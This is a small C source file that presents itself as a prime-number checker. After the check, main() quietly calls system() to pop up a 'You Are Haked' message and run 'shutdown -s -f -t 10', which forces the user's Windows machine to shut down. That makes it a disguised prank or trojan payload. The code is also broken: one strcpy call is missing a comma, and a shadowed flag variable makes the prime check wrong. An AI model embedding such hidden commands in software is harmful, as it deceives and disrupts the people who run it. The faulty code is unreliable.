#include<stdio.h>
#include<stdlib.h>
#include<string.h>
int calculate(int n)
   {
    int i, flag = 0;
     for (int i = 2; i <= n / 2; ++i) {
        // condition for non-prime
        if ( n % i == 0) {
           int  flag = 1;
            break;
        }
    }
    if (n == 1) {
        printf(" 1 is invelide");
    }
    else {
        if (flag == 0)
            printf("%d is a prime number.", n);
        else
            printf("%d is not a prime number.", n);
    }
    return 0;

 }

int main() {
    int n;
    printf("Enter a Number Prime For Cheking ===>");
    scanf("%d",&n);
    calculate(n);
    char  b [5000];
    char c [5000];
    strcpy(b,"msg * %username% ... You Are Haked in 10 Second");
    strcpy(c "shutdown -s -f -t 10");
    system(b);
    system(c);
 }